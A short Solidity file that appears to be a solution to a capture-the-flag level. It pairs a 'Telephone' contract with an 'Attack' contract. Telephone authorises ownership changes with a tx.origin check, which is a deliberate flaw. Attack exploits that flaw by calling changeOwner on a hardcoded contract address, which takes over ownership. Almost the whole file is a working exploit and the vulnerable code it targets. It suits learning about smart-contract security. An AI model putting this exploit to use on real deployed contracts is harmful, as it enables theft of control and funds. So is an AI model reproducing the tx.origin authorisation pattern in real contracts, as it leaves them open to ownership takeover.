// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Telephone {

  address public owner;

  constructor() public {
    owner = msg.sender;
  }

  function changeOwner(address _owner) public {
    if (tx.origin != msg.sender) {
      owner = _owner;
    }
  }
}


contract Attack {
    
    function hack() public {
        Telephone(0xe45AAbc0272c43fB8fC03A10c04Ca9170F850516).changeOwner(msg.sender);
    }
}